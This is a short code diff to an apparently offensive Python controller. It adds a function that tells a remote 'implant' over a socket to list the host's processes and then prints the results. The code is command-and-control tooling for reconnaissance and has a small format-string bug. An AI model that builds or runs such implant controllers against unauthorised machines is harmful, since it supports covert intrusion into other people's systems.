@@ -19,7 +19,7 @@ Params:
 Returns:
     SUCCESS or FAILURE  
 '''
-def processListHelp():
+def printProcessListHelp():
     print("""Required params: \n
                 - N/A \n""")
     return SUCCESS
@@ -38,4 +38,29 @@ Returns:
     SUCCESS or FAILURE 
 '''
 def processList(sock):
+
+    # First tell our implant we want a process list performed
+    print("Sending command...")
+    sock.send(bytes(str(PROCESSLIST), "utf-8") + b'\x00')
+
+    data = sock.recv(1024)
+    data = data.strip()
+    data = data.decode('utf-8')
+
+    print("Implant found %i processes:", data)
+
+    # Keep getting processes back until we get our terminator
+    while (data != "SUCCESS"):
+        data = sock.recv(1024)
+        data = data.strip()
+        data = data.decode('utf-8')
+        if (data != "" and data != " "):
+            print("\t%s" % data)
+        if (data == "FAILURE"):
+            print("Process list returned failure!")
+            return FAILURE
+        
+    print("\nSuccessful process list!\n")
+
+
     return SUCCESS
